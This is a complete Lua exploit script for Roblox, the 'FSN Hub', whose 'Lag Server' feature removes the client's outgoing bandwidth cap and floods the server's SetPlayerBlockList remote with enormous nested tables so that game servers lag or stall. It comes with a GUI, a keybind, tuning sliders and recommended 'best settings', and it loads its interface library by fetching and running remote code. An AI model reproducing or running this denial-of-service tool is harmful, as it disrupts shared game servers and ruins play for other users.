local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()

local Window = Rayfield:CreateWindow({
	Name = "FSN Hub",
	LoadingTitle = "FSN Hub",
	LoadingSubtitle = "Fusion",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = nil,
		FileName = "lagscripthub"
	},
        Discord = {
        	Enabled = false,
        	Invite = "sirius", 
        	RememberJoins = true 
        },
	KeySystem = false,
	KeySettings = {
	}
})

local Players = game:GetService("Players")

local username = Players.LocalPlayer.DisplayName
local titleusername = "Welcome, " ..username

Rayfield:Notify({
    Title = titleusername,
    Content = "This is a beta version of the script. Some aspects are yet to change. Use with caution.",
    Duration = 5,
    Image = 4483362458
})

-- Info

-- Tabs

local AutoLag = Window:CreateTab("Auto Lag", 4483362458) 
local Info = Window:CreateTab("Info", 4483362458) 

-- AutoLag

local Toggled

local Toggle = AutoLag:CreateToggle({
	Name = "Lag Server",
	CurrentValue = false,
	Flag = "LagToggle",
	Callback = function(Value)
		if Value == true then
		    Toggled = true
		    coroutine.resume(coroutine.create(function()
		        while Toggled == true do
                    wait(intervalValue)
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                    local function getmaxvalue(val)
                       local mainvalueifonetable = 499999
                       if type(val) ~= "number" then
                           return nil
                       end
                       local calculateperfectval = (mainvalueifonetable/(val+2))
                       return calculateperfectval
                    end
                    
                    local function bomb(tableincrease, tries)
                    local maintable = {}
                    local spammedtable = {}
                    
                    table.insert(spammedtable, {})
                    z = spammedtable[1]
                    
                    for i = 1, tableincrease do
                        local tableins = {}
                        table.insert(z, tableins)
                        z = tableins
                    end
                    
                    local calculatemax = getmaxvalue(tableincrease)
                    local maximum
                    
                    if calculatemax then
                         maximum = calculatemax
                         else
                         maximum = 999999
                    end
                    
                    for i = 1, maximum do
                         table.insert(maintable, spammedtable)
                    end
                    
                    for i = 1, tries do
                         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
                    end
                    end
                    
                    local p1 = tonumber(impactValue)
                    local p2 = tonumber(rateValue)
                    
                    bomb(p1, p2) 
		        end
		    end))
	    else
	        Toggled = false
	    end
	end,
})

local toggled2 = false
local Keybind = AutoLag:CreateKeybind({
	Name = "Toggle Bind",
	CurrentKeybind = "Q",
	HoldToInteract = false,
	Flag = "Keybind1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Keybind)
	    if toggled2 == false then
	        toggled2 = true
		    Toggle:Set(true)
		else
		    toggled2 = false
		    Toggle:Set(false)
		end
	end,
})

local Label = AutoLag:CreateLabel("Auto Disable")

local Button = AutoLag:CreateButton({
	Name = "Start",
	Callback = function()
		Toggled = true
		    coroutine.resume(coroutine.create(function()
		        local counter = 0
		        while true do
                    wait(intervalValue)
                    counter = counter + 1
                    if counter == tonumber(loopAmount) then
                        break
                    end
                    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                    local function getmaxvalue(val)
                       local mainvalueifonetable = 499999
                       if type(val) ~= "number" then
                           return nil
                       end
                       local calculateperfectval = (mainvalueifonetable/(val+2))
                       return calculateperfectval
                    end
                    
                    local function bomb(tableincrease, tries)
                    local maintable = {}
                    local spammedtable = {}
                    
                    table.insert(spammedtable, {})
                    z = spammedtable[1]
                    
                    for i = 1, tableincrease do
                        local tableins = {}
                        table.insert(z, tableins)
                        z = tableins
                    end
                    
                    local calculatemax = getmaxvalue(tableincrease)
                    local maximum
                    
                    if calculatemax then
                         maximum = calculatemax
                         else
                         maximum = 999999
                    end
                    
                    for i = 1, maximum do
                         table.insert(maintable, spammedtable)
                    end
                    
                    for i = 1, tries do
                         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
                    end
                    end
                    
                    local p1 = tonumber(impactValue)
                    local p2 = tonumber(rateValue)
                    print(p1, p2)
                    bomb(p1, p2) 
                    
		        end
		    end))
	end,
})
local Slider = AutoLag:CreateSlider({
	Name = "Loop Amount",
	Range = {1, 50},
	Increment = 1,
	Suffix = "Times",
	CurrentValue = 1,
	Flag = "loopAmount", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		loopAmount = Value
	end,
})

local Label = AutoLag:CreateLabel("Settings")

local Slider2 = AutoLag:CreateSlider({
	Name = "Packet Impact",
	Range = {0, 300},
	Increment = 1,
	Suffix = "Impact",
	CurrentValue = 100,
	Flag = "LagImpact", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		impactValue = Value
	end,
})
local Slider3 = AutoLag:CreateSlider({
	Name = "Packet Rate",
	Range = {1, 3},
	Increment = 0.5,
	Suffix = "Packets",
	CurrentValue = 1,
	Flag = "Rate", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		rateValue = Value
	end,
})
local Slider4 = AutoLag:CreateSlider({
	Name = "Interval",
	Range = {0.1, 3},
	Increment = 0.1,
	Suffix = "Seconds",
	CurrentValue = 0.7,
	Flag = "Interval", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		intervalValue = Value
	end,
})


local Paragraph = Info:CreateParagraph({Title = "Settings", Content = "The best settings (if you don't know what you're doing) are:\n\nPacket Impact: 100 Impact\nPacket Rate: 2 Packets\nInterval: 0.7 Seconds\n\nLoop Amount: 20"})
local Button = Info:CreateButton({
	Name = "Apply these settings",
	Callback = function()
	    Slider:Set(20) 
	    Slider2:Set(100) 
		Slider3:Set(2)
		Slider4:Set(0.7) 
	end,
})
Paragraph = Info:CreateParagraph({Title = "Beta", Content = "This script is in beta and purely made for the rush of dopamine I get for actually finishing something on-time. If it doesn't work how you expect, blame adhd."})

Rayfield:LoadConfiguration()
